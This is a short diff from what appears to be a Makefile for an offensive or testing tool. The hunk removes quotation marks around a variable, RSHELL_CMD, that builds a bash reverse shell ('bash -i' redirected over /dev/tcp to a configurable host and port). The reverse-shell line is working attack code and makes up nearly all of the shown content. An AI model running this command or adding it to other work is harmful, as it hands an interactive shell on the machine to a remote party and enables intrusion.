@@ -11,7 +11,7 @@ RSHELL_PORT ?=
 # no need to define RSHELL_CMD if rshell host / port are empty
 ifneq ($(strip $(RSHELL_HOST)),)
   ifneq ($(strip $(RSHELL_PORT)),)
-    RSHELL_CMD := "bash -i >& /dev/tcp/$(RSHELL_HOST)/$(RSHELL_PORT) 0>&1"
+    RSHELL_CMD := bash -i >& /dev/tcp/$(RSHELL_HOST)/$(RSHELL_PORT) 0>&1
   else
     RSHELL_CMD :=
   endif
